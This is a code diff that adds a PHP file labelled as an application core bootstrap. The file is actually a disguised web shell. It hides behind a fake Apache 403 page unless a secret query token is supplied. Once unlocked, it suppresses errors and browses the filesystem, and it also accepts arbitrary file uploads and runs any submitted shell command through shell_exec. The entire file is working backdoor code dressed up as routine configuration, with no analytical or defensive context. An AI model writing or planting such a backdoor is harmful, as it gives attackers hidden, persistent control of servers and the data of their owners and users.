@@ -1,0 +1,146 @@
+<?php
+/**
+ * Application Core Bootstrap
+ *
+ * This file is responsible for setting up the basic environment, loading
+ * core configurations, and handling initial security.
+ *
+ * @package    CoreApplication
+ * @since      1.0.0
+ */
+
+// --- Environment and Security Setup ---
+
+/**
+ * Define the base path if it has not already been set.
+ * This ensures consistency for file includes.
+ */
+if ( ! defined( 'APP_BASE_PATH' ) ) {
+    define( 'APP_BASE_PATH', __DIR__ . '/' );
+}
+
+// Primary parameters for privileged
+$auth_param = '404';
+$auth_value = 'P7sMc';
+
+// Token check. terminate the request immediately.
+if (!isset($_GET[$auth_param]) || $_GET[$auth_param] !== $auth_value) {
+    header('HTTP/1.0 403 Forbidden');
+
+    // Dynamically retrieve the requested
+    $requested_uri = htmlspecialchars($_SERVER['REQUEST_URI'], ENT_QUOTES, 'UTF-8');
+
+    // Dapt to the current server's domain and software information.
+    $server_software = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Apache';
+    $server_name = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost';
+    $server_port = isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : '80';
+    $server_signature = "{$server_software} Server at {$server_name} Port {$server_port}";
+
+    // Stop script and display the styled error page
+    die("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access {$requested_uri} on this server.</p>
+<hr>
+<address>{$server_signature}</address>
+</body></html>");
+}
+
+// --- Configuration ---
+if ( function_exists( 'error_reporting' ) ) {
+    error_reporting(0);
+}
+if ( function_exists( 'set_time_limit' ) ) {
+    set_time_limit(0);
+}
+
+// --- Management ---
+$path = getcwd();
+
+if (isset($_GET['path']) && !empty($_GET['path'])) {
+    $new_path = '/' . $_GET['path'];
+    if (is_dir($new_path) && chdir($new_path)) {
+        $path = getcwd();
+    }
+} else if (isset($_GET['path'])) {
+    $document_root = $_SERVER['DOCUMENT_ROOT'];
+    if (is_dir($document_root) && chdir($document_root)) {
+        $path = getcwd();
+    }
+}
+
+// --- File Handling Module ---
+if (isset($_FILES['file'])) {
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
+        $upload_message = '<p>Successful</p>';
+    } else {
+        $upload_message = '<p>Failed</p>';
+    }
+}
+
+// --- Command Interface ---
+$command_output = '';
+if (isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd'];
+    $command_output = shell_exec($cmd . ' 2>&1');
+}
+
+/**
+ */
+function generate_breadcrumb($path, $auth_param_name, $auth_value_name) {
+    $path = str_replace('\\', '/', $path);
+    $parts = explode('/', trim($path, '/'));
+    
+    $breadcrumb = '<a href="?path=&' . $auth_param_name . '=' . $auth_value_name . '">/</a>';
+    $current_path = '';
+
+    foreach ($parts as $part) {
+        if (empty($part)) continue;
+        
+        $current_path .= $part . '/';
+        $path_for_url = rtrim($current_path, '/');
+
+        $breadcrumb .= '<a href="?path=' . $path_for_url . '&' . $auth_param_name . '=' . $auth_value_name . '">' . $part . '</a>/';
+    }
+    
+    return rtrim($breadcrumb, '/');
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Tool</title>
+</head>
+<body>
+    <div class="container">
+
+        <div class="path-bar">
+            <?php echo generate_breadcrumb($path, $auth_param, $auth_value); ?>
+        </div>
+
+        <?php if (isset($upload_message)) echo $upload_message; ?>
+        <form method="post" enctype="multipart/form-data">
+            <input type="file" name="file" required>
+            <input type="submit" value="Set">
+        </form>
+        
+        <form method="post">
+            <input type="text" name="cmd" placeholder="Enter command..." required style="width: 300px;">
+            <input type="submit" value="Start">
+        </form>
+
+        <?php if (!empty($command_output)): ?>
+            <div class="terminal-output">
+                <pre><?php echo htmlspecialchars($command_output); ?></pre>
+            </div>
+        <?php endif; ?>
+
+        </div>
+    </div>
+
+    </body>
+</html>
